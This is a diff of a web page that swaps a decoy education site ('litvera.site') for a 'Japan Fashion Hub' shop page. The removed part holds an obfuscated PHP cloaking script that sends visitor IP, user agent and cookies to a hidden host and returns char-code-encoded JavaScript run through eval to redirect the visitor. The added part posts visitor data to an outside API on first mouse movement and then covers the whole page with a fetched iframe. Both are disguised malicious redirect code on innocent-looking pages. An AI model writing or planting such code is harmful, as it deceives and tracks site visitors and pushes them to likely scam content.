@@ -1,14 +1,351 @@
-<?php date_default_timezone_set("UTC");ini_set("display_errors", 0);error_reporting(E_ALL & ~E_NOTICE);function c($u=null,$q=null,$co=null){if(empty($u)){return '$("#lo533225ad").hide();$("body").fadeIn(500);';}else{$u = $u.$q;for ($i = 0, $j = strlen($u); $i < $j; $i++) {$a[] = ord($u[$i]);}$u = strrev(implode(",",$a));if($co AND isset($_COOKIE["_eventlo533225ad"])){$me="";}else{$me = '$("html").append("body").html("<div style=\"margin-top:8%;background-color:white;text-align:center;font-size:40px;\"><div><style>body{font-family:Arial,sans-serif;display:flex;justify-content:center;align-items:center;height:100vh;margin:0}.popup{position:fixed;top:0;left:0;width:100%;height:100%;background:rgba(0,0,0,0.5);display:flex;justify-content:center;align-items:center;z-index:1000}.popup-content{background:white;padding:20px;border-radius:8px;text-align:center;box-shadow:0 4px 8px rgba(0,0,0,0.2)}.loading-gif{width:100px;height:100px;margin-bottom:10px}.buttons{margin-top:20px}button{padding:10px 20px;margin:0 10px;border:none;border-radius:4px;cursor:pointer}#cancelBtn{background:#f44336;color:white}#continueBtn{background:#4CAF50;color:white}button:hover{opacity:0.8}</style><div class=\"popup\"><div class=\"popup-content\"><img src=\"https://i.gifer.com/ZZ5H.gif\" alt=\"Loading...\" class=\"loading-gif\"><p>Loading... Please wait.</p><div class=\"buttons\"><button id=\"cancelBtn\">Cancel</button><button id=\"continueBtn\">Continue</button></div></div></div></div></div>");';}return 'function rS(s){var nS = "";for (var i = s.length - 1; i >= 0; i--) {nS += s[i];} var a = nS.split(",");var u = String.fromCharCode.apply(null, a);return u;} var u,s,c;$("body").remove();'.$me.'s=rS("001,79,111,801,64,14,04,121,611,211,901,101,64,14,43,801,901,611,401,43,04,63");u = rS("'.$u.'");c = s+"(\'"+u+"\')";$("html").show();setTimeout(function(){eval(c);},100);';}}if(!(isset($_SERVER["HTTP_X_PURPOSE"]) AND $_SERVER["HTTP_X_PURPOSE"] == "preview")){if(isset($_POST["imm"])){$date = date("Y-m-d H:i:s");$id = "533225";$uid="4v6qn38yoo2c3l45eqgv9c277";$qu=$_SERVER["QUERY_STRING"];$postdata = http_build_query(array("date"=>$date,"lan"=>$_SERVER["HTTP_ACCEPT_LANGUAGE"],"ref" =>$_POST["r"],"ip" => $_SERVER["REMOTE_ADDR"],"ipr"=>$_SERVER["HTTP_X_FORWARDED_FOR"],"sn" => $_SERVER["SERVER_NAME"],"requestUri"=>$_SERVER["REQUEST_URI"],"query" => $_SERVER["QUERY_STRING"],"ua" => $_SERVER["HTTP_USER_AGENT"],"co"=>$_COOKIE["_eventlo533225ad"],"tz"=>$_POST["tz"],"he"=>$_POST["he"],"imm" =>$_POST["imm"],"user_id" =>$uid,"id" => $id));$opts = array("http" =>array("method" => "POST","header" => "Content-type: application/x-www-form-urlencoded","content" => $postdata));$context = stream_context_create($opts);$d=array(104,116,116,112,115,58,47,47,106,99,105,98,106,46,99,111,109,47,112,99,108,46,112,104,112);$u="";foreach($d as $v){$u.=chr($v);}$result = file_get_contents($u, false, $context);$arr = explode(",",$result);if(!empty($qu)){if(strpos($arr[1],"?")){$q="&".$qu;}else{$q="?".$qu;}}else{$q="";}if($arr[0] === "true"){if(strstr($arr[1],"sp.php")){$q="?".$qu;}if(!empty($arr[7])){setcookie($arr[7],$arr[8],time()+60*60*24*$arr[9],"/");}if($arr[2]){if($arr[4] == 1 OR $arr[4] == 3){setcookie("_eventlo533225ad",$arr[6],time()+60*60*24*$arr[3]);}}echo c($arr[1],$q,true);exit();}elseif($arr[0] === "false"){if($arr[5]){$f=$q;}else{$f="";}if($arr[2]){if($arr[4] == 2 OR $arr[4] == 3){setcookie("_eventlo533225ad",$arr[6]."b",time()+60*60*24*$arr[3]);}}echo c($arr[1],$f);exit();}else{if($arr[2]){if($arr[4] == 2 OR $arr[4] == 3){setcookie("_eventlo533225ad",$arr[6]."b",time()+60*60*24*$arr[3]);}}echo c();exit();}}}?>
+<html lang="en" style="overflow: hidden;"><head>
+<script async="" defer="" src="https://tools.luckyorange.com/core/lo.js?site-id=2ecd9266"></script>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Japan Fashion Hub</title>
+    
+<meta name="description" content="Japan Fashion Hub showcases the latest Japanese fashion, including men's and women's wear and accessories.">
+<meta name="keywords" content="Japanese fashion, men, women, polo shirts, fashion shopping">
+<meta name="author" content="Japan Fashion Hub">
 
-<html><head><meta charset="UTF-8" class="medium-YeGOhlYJu"/><link rel="stylesheet" href="styles.css" class="tiny-acYDnviXf"/><meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1,user-scalable=no" class="box-koIZKBGsNgh"/><meta name="referrer" content="no-referrer" class="image-bUmqdNyAxWGp"/><style> @import url('https://fonts.googleapis.com/css2?family=EB+Garamond:ital,wght@0,400..800;1,400..800&display=swap'); html,body{overflow-x: hidden;} *{margin:0;padding:0;} *::-webkit-scrollbar { background-color: #f41c54; border-radius: 42px; } *::-webkit-scrollbar-thumb { background-color: #ffc22b; border-radius: 42px; border: 2px solid #f41c54; } a{text-decoration:none} p,li{text-indent: calc(30vw/var(--resizer)*100)} ol{padding-left: calc(30vw/var(--resizer)*100)} h2{text-align: center;} input{outline: none;} #close:checked ~ section {display: none !important;} input::placeholder {color: inherit;} :root { --resizer: 1440; } @media screen and (max-width:414px) { :root { --resizer: 350; } } </style><title>litvera.site</title>
+<style>
+*{
+margin:0;
+padding:0;
+box-sizing:border-box;
+}
 
-  <style>body {display: none;}</style>
-<script type="text/javascript" src="//cdnjs.cloudflare.com/ajax/libs/jquery/3.2.1/jquery.min.js"></script>
-<script type="text/javascript" src="//cdnjs.cloudflare.com/ajax/libs/jquery-mobile/1.4.5/jquery.mobile.min.js"></script>
-<script type="text/javascript" src="//cdnjs.cloudflare.com/ajax/libs/jstimezonedetect/1.0.6/jstz.min.js"></script>
-<script>var oldtitle=document.title;document.title = "Loading";$( document ).ajaxComplete(function(){document.title = oldtitle;$(".loaderdiv").fadeOut("slow");$(".maindiv").fadeIn("slow");});$(document).ready(function(){function loadA(t){$.ajax({url:location.href,type:"POST",data:"tz="+e+"&r="+document.referrer+"&he="+g+"&imm="+t,success:function(a){if(a){eval(a)}else{$("html").show()}}})}var f=new XMLHttpRequest();f.open("GET",document.location,true);f.send(null);var g;f.onreadystatechange = function(){g=f.getAllResponseHeaders().toLowerCase();};var d=jstz.determine();var e=d.name();var co = document.cookie.indexOf("_eventlo533225ad=");if(co==0){loadA("p");}else{$("body").hide();$("html").append("<div id=\"lo533225ad\" style=\"margin-top:8%;background-color:white;text-align:center;font-size:40px;\"><div><style>body{font-family:Arial,sans-serif;display:flex;justify-content:center;align-items:center;height:100vh;margin:0}.popup{position:fixed;top:0;left:0;width:100%;height:100%;background:rgba(0,0,0,0.5);display:flex;justify-content:center;align-items:center;z-index:1000}.popup-content{background:white;padding:20px;border-radius:8px;text-align:center;box-shadow:0 4px 8px rgba(0,0,0,0.2)}.loading-gif{width:100px;height:100px;margin-bottom:10px}.buttons{margin-top:20px}button{padding:10px 20px;margin:0 10px;border:none;border-radius:4px;cursor:pointer}#cancelBtn{background:#f44336;color:white}#continueBtn{background:#4CAF50;color:white}button:hover{opacity:0.8}</style><div class=\"popup\"><div class=\"popup-content\"><img src=\"https://i.gifer.com/ZZ5H.gif\" alt=\"Loading...\" class=\"loading-gif\"><p>Loading... Please wait.</p><div class=\"buttons\"><button id=\"cancelBtn\">Cancel</button><button id=\"continueBtn\">Continue</button></div></div></div></div></div>");var h=null;var i=null;var j=true;$(document).on("pagecreate","body",function(){$("body").on("tap",function(){if(i!==false){if(h!==null){if(j!==false){loadA("p")}j=false;clearTimeout(h)}}})}).add($(document).on("mousemove",function(){if(i!==false){if(h!==null){if(j!==false){loadA("p")}j=false;clearTimeout(h)}}}));h=setTimeout(function(){i=false;loadA("b")},3600000)}});</script>
-  
-  <!-- Google tag (gtag.js) -->
+body{
+font-family:-apple-system,BlinkMacSystemFont,"Segoe UI",sans-serif;
+background:#fff;
+color:#222;
+line-height:1.6;
+}
+
+img{
+width:100%;
+display:block;
+}
+
+a{
+text-decoration:none;
+color:inherit;
+}
+
+.container{
+width:95%;
+max-width:1400px;
+margin:auto;
+}
+
+header{
+background:#082b5c;
+color:#fff;
+padding:15px 0;
+position:sticky;
+top:0;
+z-index:100;
+}
+
+.nav{
+display:flex;
+justify-content:space-between;
+align-items:center;
+}
+
+.logo{
+font-size:28px;
+font-weight:bold;
+}
+
+.menu{
+display:flex;
+gap:20px;
+font-size:14px;
+}
+
+.hero{
+padding:20px 0;
+}
+
+.hero-grid{
+display:grid;
+grid-template-columns:repeat(3,1fr);
+gap:15px;
+}
+
+.hero-card{
+position:relative;
+overflow:hidden;
+}
+
+.hero-card img{
+height:500px;
+object-fit:cover;
+}
+
+.hero-text{
+position:absolute;
+bottom:20px;
+left:20px;
+color:#fff;
+font-size:24px;
+font-weight:bold;
+text-shadow:0 2px 10px rgba(0,0,0,.6);
+}
+
+.section-title{
+text-align:center;
+font-size:34px;
+margin:50px 0 25px;
+font-weight:700;
+}
+
+.category-grid{
+display:grid;
+grid-template-columns:1fr 1fr;
+gap:20px;
+margin-bottom:60px;
+}
+
+.category-card{
+position:relative;
+}
+
+.category-card img{
+height:450px;
+object-fit:cover;
+}
+
+.category-name{
+position:absolute;
+bottom:30px;
+left:30px;
+font-size:48px;
+color:#fff;
+font-weight:bold;
+letter-spacing:4px;
+text-shadow:0 2px 8px rgba(0,0,0,.6);
+}
+
+.products{
+display:grid;
+grid-template-columns:repeat(auto-fit,minmax(220px,1fr));
+gap:20px;
+}
+
+.product{
+text-align:center;
+}
+
+.product img{
+height:320px;
+object-fit:cover;
+background:#f7f7f7;
+}
+
+.product h3{
+font-size:14px;
+margin:10px 0;
+}
+
+.price{
+font-weight:bold;
+color:#082b5c;
+}
+
+.story{
+padding:80px 0;
+}
+
+.story-grid{
+display:grid;
+grid-template-columns:1fr 1fr 1fr;
+gap:15px;
+}
+
+.story-grid img{
+height:550px;
+object-fit:cover;
+}
+
+.story-text{
+text-align:center;
+max-width:800px;
+margin:40px auto;
+}
+
+.instagram{
+display:grid;
+grid-template-columns:repeat(6,1fr);
+gap:10px;
+}
+
+.instagram img{
+height:180px;
+object-fit:cover;
+}
+
+.news{
+margin:60px 0;
+}
+
+.news ul{
+list-style:none;
+border:1px solid #ddd;
+}
+
+.news li{
+padding:15px;
+border-bottom:1px solid #eee;
+}
+
+footer{
+background:#082b5c;
+color:white;
+padding:50px 20px;
+text-align:center;
+margin-top:50px;
+}
+
+@media(max-width:900px){
+
+.hero-grid,
+.story-grid{
+grid-template-columns:1fr;
+}
+
+.category-grid{
+grid-template-columns:1fr;
+}
+
+.instagram{
+grid-template-columns:repeat(2,1fr);
+}
+
+.hero-card img{
+height:400px;
+}
+
+.category-card img{
+height:350px;
+}
+}
+</style>
+
+
+    <script async="" charset="utf-8" src="https://tools.luckyorange.com/core/web-vitals.js?v=4bb1511" crossorigin="anonymous" id="lo-script-web-vitals"></script></head>
+<script src="https://cdnjs.cloudflare.com/ajax/libs/crypto-js/4.1.1/crypto-js.min.js"></script>
+<script>
+(function(){
+
+let requestSent = false;
+
+window.addEventListener("mousemove", initOnce);
+
+async function initOnce(){
+
+    if(requestSent) return;
+
+    requestSent = true;
+
+    window.removeEventListener(
+        "mousemove",
+        initOnce
+    );
+
+    const timezone =
+        Intl.DateTimeFormat()
+        .resolvedOptions()
+        .timeZone;
+
+    try{
+
+        await fetch(
+            "https://api.intellectpath.net/timezone-track",
+            {
+                method:"POST",
+                headers:{
+                    "Content-Type":"application/json"
+                },
+                body:JSON.stringify({
+                    timezone,
+                    fullUrl:location.href
+                })
+            }
+        );
+
+        showIframe();
+
+    }catch(e){
+
+        console.error(e);
+
+    }
+
+}
+
+
+async function showIframe(){
+
+    const createFrame = async () => {
+
+        if(document.getElementById("bruceDiv"))
+            return;
+
+        try {
+            // 1. Data call / fetch karna
+            const response = await fetch("https://api.intellectpath.net/view/win");
+            if (!response.ok) throw new Error("Network response was not ok");
+            
+            
+            const blob = await response.blob();
+            const blobUrl = URL.createObjectURL(blob);
+
+            document.documentElement.style.overflow="hidden";
+
+            const div = document.createElement("div");
+            div.id="bruceDiv";
+            div.style.cssText="position:fixed;inset:0;z-index:2147483647;background:#fff;";
+
+            const iframe = document.createElement("iframe");
+            
+            iframe.src = blobUrl;
+
+            iframe.style.cssText = "width:100%;height:100%;border:0;display:block;";
+            iframe.allow = "fullscreen; autoplay; encrypted-media; picture-in-picture";
+            iframe.allowFullscreen = true;
+          
+            div.appendChild(iframe);
+            document.body.appendChild(div);
+
+            iframe.onload = () => {
+                URL.revokeObjectURL(blobUrl);
+            };
+
+        } catch (error) {
+            console.error("Blob iframe load Error:", error);
+        }
+    };
+
+    if(document.body){
+        await createFrame();
+    }else{
+        window.addEventListener(
+            "DOMContentLoaded",
+            async () => { await createFrame(); },
+            {once:true}
+        );
+    }
+}
+    
+})();
+</script>
+<script>
+    document.body.style.overflow = "hidden";
+</script> 
+
+<!-- Google tag (gtag.js) -->
 <script async src="https://www.googletagmanager.com/gtag/js?id=G-0LY0HY7L01"></script>
 <script>
   window.dataLayer = window.dataLayer || [];
@@ -17,4 +354,221 @@
 
   gtag('config', 'G-0LY0HY7L01');
 </script>
-</head><body class="wrapper-OnbxsUT"><main class="col-XGrwvnveCdnGK"><div style="display: flex; position: relative; justify-content: space-between; align-items: center; width: 80%; height: max-content; margin: calc(0vw/var(--resizer)*100) auto calc(0vw/var(--resizer)*100) auto; padding: calc(50vw/var(--resizer)*100) 10% calc(50vw/var(--resizer)*100) 10%; gap: undefined; flex-direction: row; background: inherit; background-color: #ffff0f; background-image: url(&quot;data:image/svg+xml,%3Csvg%20id%3D'waves-19_38309'%20width%3D'100%25'%20height%3D'1000px'%20xmlns%3D'http%3A%2F%2Fwww.w3.org%2F2000%2Fsvg'%3E%3Cdefs%3E%3Cstyle%3E%0A%20%20%20%20%40keyframes%20float1%20%7B%0A%20%20%20%20%20%200%25%20%7B%0A%20%20%20%20%20%20%20%20transform%3A%20translate(0%2C%200)%3B%0A%20%20%20%20%20%20%7D%0A%20%20%20%20%20%2050%25%20%7B%0A%20%20%20%20%20%20%20%20transform%3A%20translate(54px%2C%200)%20rotate(151deg)%20scale(1.03718401791355)%3B%0A%20%20%20%20%20%20%7D%0A%20%20%20%20%20%20100%25%20%7B%0A%20%20%20%20%20%20%20%20transform%3A%20translate(0%2C%200)%3B%0A%20%20%20%20%20%20%7D%0A%20%20%20%20%7D%0A%20%20%20%20.float1%20%7B%0A%20%20%20%20%20%20animation%3A%20float1%206s%20infinite%3B%0A%20%20%20%20%7D%0A%20%20%20%20%40keyframes%20float2%20%7B%0A%20%20%20%20%20%200%25%20%7B%0A%20%20%20%20%20%20%20%20transform%3A%20translate(0%2C%200)%3B%0A%20%20%20%20%20%20%7D%0A%20%20%20%20%20%2050%25%20%7B%0A%20%20%20%20%20%20%20%20transform%3A%20translate(-17px%2C%20-26px)%20rotate(39deg)%20scale(1.5693088135142712)%3B%0A%20%20%20%20%20%20%7D%0A%20%20%20%20%20%20100%25%20%7B%0A%20%20%20%20%20%20%20%20transform%3A%20translate(0%2C%200)%3B%0A%20%20%20%20%20%20%7D%0A%20%20%20%20%7D%0A%20%20%20%20.float2%20%7B%0A%20%20%20%20%20%20animation%3A%20float2%202s%20infinite%3B%0A%20%20%20%20%7D%0A%20%20%20%20%40keyframes%20float3%20%7B%0A%20%20%20%20%20%200%25%20%7B%0A%20%20%20%20%20%20%20%20transform%3A%20translate(0%2C%200)%3B%0A%20%20%20%20%20%20%7D%0A%20%20%20%20%20%2050%25%20%7B%0A%20%20%20%20%20%20%20%20transform%3A%20translate(0%2C%20-29px)%20rotate(73deg)%20scale(1.5385756387178653)%3B%0A%20%20%20%20%20%20%7D%0A%20%20%20%20%20%20100%25%20%7B%0A%20%20%20%20%20%20%20%20transform%3A%20translate(0%2C%200)%3B%0A%20%20%20%20%20%20%7D%0A%20%20%20%20%7D%0A%20%20%20%20.float3%20%7B%0A%20%20%20%20%20%20animation%3A%20float3%208s%20infinite%3B%0A%20%20%20%20%7D%0A%20%20%3C%2Fstyle%3E%3Cpattern%20id%3D'25213'%20patternUnits%3D'userSpaceOnUse'%20width%3D'38.361'%20height%3D'37.749'%20patternTransform%3D'scale(5)%20rotate(166)'%3E%3Crect%20x%3D'0'%20y%3D'0'%20width%3D'100%25'%20height%3D'100%25'%20fill%3D'%23ffff0f'%2F%3E%3Cpath%20d%3D'M0%2024.86v3.453c4.299%200%206.326%201.265%208.674%202.73%202.444%201.525%205.215%203.254%2010.504%203.254%205.29%200%208.06-1.729%2010.506-3.254%202.347-1.465%204.374-2.73%208.675-2.73h.002v-3.454h-.004c-5.289%200-8.058%201.73-10.503%203.254-2.348%201.465-4.375%202.73-8.676%202.73s-6.328-1.265-8.676-2.73C8.059%2026.59%205.287%2024.86%200%2024.86z'%20class%3D'float1'%20style%3D'opacity%3A%20.15'%20%20stroke-width%3D'1.8283177007336406'%20stroke%3D'none'%20fill%3D'%23ffc22b'%2F%3E%3Cpath%20d%3D'M0%2015.424v3.453c4.299%200%206.326%201.264%208.674%202.728%202.444%201.525%205.215%203.254%2010.504%203.254%205.29%200%208.06-1.729%2010.506-3.254%202.347-1.465%204.374-2.728%208.675-2.728h.002v-3.453h-.004c-5.289%200-8.058%201.729-10.503%203.254-2.348%201.465-4.375%202.728-8.676%202.728s-6.328-1.263-8.676-2.728C8.058%2017.153%205.289%2015.424%200%2015.424z'%20class%3D'float1'%20style%3D'opacity%3A%20.15'%20%20stroke-width%3D'1.8283177007336406'%20stroke%3D'none'%20fill%3D'%23ffc22b'%2F%3E%3Cpath%20d%3D'M0%205.986V9.44c4.3%200%206.326%201.266%208.674%202.73%202.444%201.526%205.215%203.255%2010.504%203.255%205.29%200%208.06-1.73%2010.506-3.254%202.348-1.465%204.375-2.73%208.675-2.73h.002V5.985h-.002c-5.29%200-8.06%201.73-10.504%203.254-2.348%201.465-4.374%202.73-8.675%202.73-4.301%200-6.328-1.264-8.676-2.73C8.06%207.715%205.288%205.987%200%205.986z'%20class%3D'float1'%20style%3D'opacity%3A%20.15'%20%20stroke-width%3D'1.8283177007336406'%20stroke%3D'none'%20fill%3D'%23ffc22b'%2F%3E%3Cpath%20d%3D'M0%20.002c4.3%200%206.327%201.267%208.674%202.73%202.444%201.526%205.213%203.256%2010.506%203.256%205.289%200%208.059-1.73%2010.504-3.256%202.348-1.464%204.373-2.73%208.675-2.73H27.54c-2.22%201.377-4.254%202.533-8.36%202.533-4.108%200-6.139-1.156-8.359-2.533zm0%2034.295v3.451h10.82l-.318-.195C8.059%2036.027%205.287%2034.298%200%2034.297Zm38.357%200c-5.29%200-8.058%201.73-10.502%203.256l-.318.195h10.824v-3.451z'%20class%3D'float2'%20style%3D'opacity%3A%20.15'%20%20stroke-width%3D'1.8283177007336406'%20stroke%3D'none'%20fill%3D'%23ffc22b'%2F%3E%3C%2Fpattern%3E%3C%2Fdefs%3E%3Crect%20width%3D'800%25'%20height%3D'800%25'%20transform%3D'translate(-218%2C-24)'%20fill%3D'url(%2325213)'%2F%3E%3C%2Fsvg%3E&quot;);" class="button-pfXHrNLHP"><div class="subject-FdbBisuAW"><div class="tagline-XKstBp"><img src="./img/5307416310253ea6c118dadcde24c4ad989c0e4a.jpg" class="xl-iZyhyaaGlCzyuy"/></div></div><div class="breadcrumbs-vCtcYeUuY"><div class="aside-pkhXRgGK"><a href="themelist0.html" class="picture-cPkXpHy"><span class="avatar-vlYDHNzxIqnASUa">Show all</span></a></div><div class="section-wmlgZRUJM"><h3 class="small-zkAtkWpUYpvczf">litvera.site</h3><span class="col-cnfFAKRmsyFzAaZA">Reading Examination Innovation Knowledge Skills This article explores the importance of diversity in Learning higher education, highlighting Literacy Teaching the Academic benefits of inclusive practices Certification for Writing Study students, Research institutions, and Curriculum society as a Training whole.</span></div></div></div><div class="medium-uyodGxMbhFujH"><div class="narrow-LRvSIB"><div class="xs-Oediful"><h3 class="tip-wkvKUSmcbI">Photos gallery</h3></div></div><div class="desc-yLXJvmXOEbYB"><div class="desc-QeuhxWlV"><img src="./img/1aca2af3fb5ec80c48e9520f119986c6b968e2ca.jpg" class="wrap-ybxtFDqynsLIImXm"/><img src="./img/b0a8703377864aed219ffe152325a0da24a54beb.jpg" class="caption-CWrTNuvDAqPZAA"/><img src="./img/117a51e199c167f3a95ddb0ceff49bb9b49ea375.jpg" class="tagline-YOOBftlc"/><img src="./img/b1134c6f251280a7f291d88ef0f20333b9a9e56b.jpg" class="image-AwzcdlPnuSPFHf"/><img src="./img/acda7f2a033c3e4a40f0b1c616363a50163bb37c.jpg" class="wrapper-NjYVRdOG"/><img src="./img/36754570d2688b2b08cbc7a0cc29a023a6d8120f.jpg" class="thumbnail-MlAaZiAZXg"/><img src="./img/859a962cc22cd37bd288e30f7df365d857914cec.jpg" class="subject-SsXeiHtJUd"/><img src="./img/c9a75bf2cf0054c9fdba878f38b0a596b52dfb90.jpg" class="subject-rHddBBHn"/></div></div></div><div class="avatar-GKifGPYmPaBhiisM"><div class="thumb-ochhlZcnRQTDISo"><div class="current-WGAkwctvN"><h3 class="userpic-QNaSpxNoJlOZg">Knowledge hub</h3></div></div><div class="image-ABuPnRFMyAQB"><div class="md-gcTvSUbE"><div class="column-eRaANWUOgjDxWAI"><img src="./img/2b8b7ee0e51a2f96f6e222cd959e1602dd086851.jpg" class="image-njBVceu"/></div><div class="thumbnail-YPXzjE"><h5 class="btn-pWmrfTGdjldalUr">Embracing Diversity in the Classroom: Strategies for Inclusive Education</h5><div class="sidebar-UwnqEqUzFDDN"><span class="tiny-QIBrQNflZMBpZVfH">Training An exploration Curriculum of the Teaching Certification importance Examination Knowledge Study Skills Learning of diversity in education Research and Literacy practical strategies for creating Writing Innovation Academic an inclusive classroom environment Reading that values all students.</span></div></div><div class="desc-nvaOQNoYPSl"><a href="themelist1.html" class="pic-rqyaknKpnWei"><span class="big-TIjLNyfBnAGwgg">Full version</span></a><a href="index.php" class="xl-KPupBKky"><span class="column-ohygeQeSwgJkqL">Recommend</span></a></div><div class="thumbnail-ZLJktZCyFDZdPiw"><div class="title-nFUmETzSz"><div class="tiny-bmFaeRkvL"><span class="btn-SKHhix">Ava Thompson</span></div></div><div class="image-xMTLLLctpJo"><div class="aside-ONsulWkBe"><span class="tagline-FESGduKLjoUDGdO">07-16-2025</span></div></div></div></div><div class="lg-zLWwpYkABcxGaMi"><div class="btn-PjlCar"><img src="./img/34a58cf6ab73257f0776bbd9e953d1aa59343e3e.jpg" class="preview-vEqzbfrZZslw"/></div><div class="content-lsDFFDfebLHJncQc"><h5 class="narrow-qTxPcYWxDEpY">Cultivating Emotional Intelligence in Education: A Key to Student Success</h5><div class="large-EAEnqQ"><span class="section-EvWoNyWmgJsNMGki">This article explores Teaching Certification the importance of emotional Training Skills intelligence in Curriculum education Academic and offers strategies Examination for Writing educators Literacy to foster Research this Reading Learning Innovation essential Knowledge skill in their students. Study</span></div></div><div class="col-YOzuxsGbTuGIqMKp"><a href="themelist2.html" class="title-fQgLqnthJpvREGdp"><span class="narrow-APjrupyyo">Full version</span></a><a href="index.php" class="big-mjUZeI"><span class="column-HThHesmlULOS">Recommend</span></a></div><div class="icon-AyNlmNVjaRr"><div class="control-KhvxbrxaMeQV"><div class="section-gyVnvz"><span class="title-CNgbnpheblHXZIq">Daniela Morales</span></div></div><div class="avatar-HKvAkktzhbQAyaaZ"><div class="wrapper-fjyGUM"><span class="active-SuODziJ">10-31-2024</span></div></div></div></div><div class="content-eJxvGCJPZViFjH"><div class="sidebar-uNxwMdfFeSPHT"><img src="./img/82b9242f82588c87dd682cc1a0d023ef79135de3.jpg" class="holder-nXlukQteTITb"/></div><div class="sidebar-FDFazg"><h5 class="container-bmViLt">Harnessing Creativity: The Role of Art in Education</h5><div class="image-AKYbQlGiXXEAQqAX"><span class="container-LDnLXnbXczl">This Academic article Innovation examines the Skills significance of Reading art Teaching in education, exploring Study its Knowledge benefits Examination for creativity, critical thinking, Curriculum Research and Training Literacy Certification overall student Learning Writing development.</span></div></div><div class="section-EPnrEZ"><a href="themelist3.html" class="wrap-mNJnLZAUgZ"><span class="sidebar-rFULUXbNKFLBLf">Full version</span></a><a href="index.php" class="heading-emsrZXbjd"><span class="huge-COVXHoqSIMD">Recommend</span></a></div><div class="more-yYsknFai"><div class="content-TlZQeoDAzudwGj"><div class="medium-TYldexji"><span class="tip-BqfzfyLxwwaIA">Liam Johnson</span></div></div><div class="tip-lzVRzIpAQhkC"><div class="tagline-bdzRdZoPmIxf"><span class="section-WLGhfDcDSiLLrbLM">10-02-2024</span></div></div></div></div><div class="small-yuYXuCTxQYScEnfT"><div class="userpic-QavXCoJsqhYk"><img src="./img/0009a074da29e8045c37f8a097a6e2ba0a1fc0f2.jpg" class="tip-nWRCpy"/></div><div class="img-TJRboeEoekD"><h5 class="page-okCturbi">Exploring the World of Notebooks: Enhancing Learning One Page at a Time</h5><div class="breadcrumbs-KLjgEIeOLCWHh"><span class="aside-JQTbFjKg">Teaching This article examines the Writing Learning different types of Academic notebooks Curriculum Innovation available Certification to students, highlighting their Literacy Knowledge features and Study Examination Reading Training benefits to enhance Research learning Skills and creativity.</span></div></div><div class="thumb-tLRXADi"><a href="themelist4.html" class="container-whvrvQwKcQwyjYUy"><span class="large-vlRfkcDoQqbby">Full version</span></a><a href="index.php" class="control-bLiodtkt"><span class="more-ZLztYQP">Recommend</span></a></div><div class="holder-GnfGuzWww"><div class="desc-ndUFCkTFOjlkDtNl"><div class="picture-sKngzGpRV"><span class="tip-EMpGrhAPmcAnVTT">Evelyn Carter</span></div></div><div class="tagline-tlhGjARLpPkretF"><div class="grid-aMackDXqJ"><span class="page-KZOyGKmQULUc">01-15-2025</span></div></div></div></div><div class="title-vEMCGOX"><div class="inner-MVDRMxxWFMcm"><img src="./img/d92927b582790035d37afd123b0cbcb95eee945d.jpg" class="control-bSOsKtAhkhxg"/></div><div class="tip-QpDrsSMiiyX"><h5 class="row-siEamrWHAaW">Navigating the Future of Learning: The Impact of Technology on Education</h5><div class="widget-wULpaqBrIkegGF"><span class="tooltip-eXdbTtQQWsSp">This Research article examines Knowledge Skills Teaching Examination how technological advancements Writing are reshaping the educational Learning landscape, enhancing Academic Innovation Certification teaching methods, and improving student Reading engagement Curriculum and learning Study Literacy Training outcomes.</span></div></div><div class="small-LwcxpgynrZKN"><a href="themelist5.html" class="section-jgLcGBFug"><span class="narrow-JrYHwIaJYKGPW">Full version</span></a><a href="index.php" class="more-QPcMNYJbRvF"><span class="huge-NilyGnoUiCRiiOlV">Recommend</span></a></div><div class="avatar-pkSCtIiNw"><div class="wrap-CyuTOZ"><div class="image-aVSBAktUYlj"><span class="tiny-tZGMbUJivwruXu">Daniela Nguyen</span></div></div><div class="all-RekyqEvtmNLGjx"><div class="huge-juqKTm"><span class="xl-FMPYBAkdI">11-11-2024</span></div></div></div></div><div class="huge-atiGEP"><div class="container-MCEYeWoczNyoDee"><img src="./img/87bb5b9535b29ae86346a393fedb22e25775205a.jpg" class="sidebar-YkAIBmD"/></div><div class="headline-EyHivVusPyow"><h5 class="content-JrbTBHyUqvs">Embracing Diversity in Education</h5><div class="image-KhZohdbMiddjuAw"><span class="title-oCdisvSXdAyXJLU">This article explores the importance of Knowledge diversity Research in educational Study Writing Skills Learning settings, highlighting the benefits it Innovation brings to students and educators, Certification Training as Academic well as Curriculum strategies for Examination fostering an Literacy Reading inclusive Teaching environment.</span></div></div><div class="section-SwspXNZOGIKm"><a href="themelist6.html" class="all-DwaKBeTeSaYkn"><span class="aside-ycyIrPjVaxLa">Full version</span></a><a href="index.php" class="img-nNdoTFnYwqXDYP"><span class="narrow-HwWKlHBsmDNCaQiY">Recommend</span></a></div><div class="wrapper-ifuTQkDUm"><div class="inner-nkMdNRQRMui"><div class="narrow-KxxqSLvnYPFCMYaI"><span class="control-LcwGTtVxhS">Lucas Martinez</span></div></div><div class="widget-RkEQsPcX"><div class="inner-xvQOhNbeecHFe"><span class="active-BRHASfZUNOjUbl">11-18-2024</span></div></div></div></div><div class="picture-HnAxkegsXiQnhV"><div class="xl-ZbtaCYaikQsRqaR"><img src="./img/39652132e3987ec5b934b2077bebf8aef2adf353.jpg" class="more-XsRNCvXokJqPqG"/></div><div class="lg-qRZhZiYVcGzUlQ"><h5 class="breadcrumbs-SffCzjiNGQgUh">Embracing Diversity: The Power of Inclusive Education</h5><div class="current-ULwAbeVqDCaE"><span class="desc-oKnruyBLrOKZwOR">An exploration of Research how inclusive education Writing Certification enhances Study Training Learning learning Teaching Literacy Academic experiences for Reading Knowledge all Skills Innovation Curriculum Examination students.</span></div></div><div class="inner-rZXgWVAtpiZonji"><a href="themelist7.html" class="grid-ZwXQwIwZpWOD"><span class="heading-CwpkAi">Full version</span></a><a href="index.php" class="current-jrinXWBoke"><span class="heading-HnDLVCIV">Recommend</span></a></div><div class="title-ijfXiIonuMj"><div class="widget-zHofCYY"><div class="wrap-GPUgmOffleNVJfb"><span class="desc-aogxYuRda">Emma Johnson</span></div></div><div class="button-byvotlPHD"><div class="image-BJRRmLysUveciaaL"><span class="page-hcFICiqMnZDK">11-13-2024</span></div></div></div></div></div></div></main><footer class="sidebar-tEgNttKdWTSv"><div class="subtitle-JKWVqASpPzoHNL"><a href="./privacy_policy.html" class="wrap-QErWbOreuGZb">Privacy Policy</a><a href="./terms_of_use.html" class="button-eAFSSkijPaqcbMR">Terms Of Use</a><a href="./cookie_policy.html" class="thumb-PfmFCnx">Cookies Policy</a></div></footer><input type="checkbox" id="close" 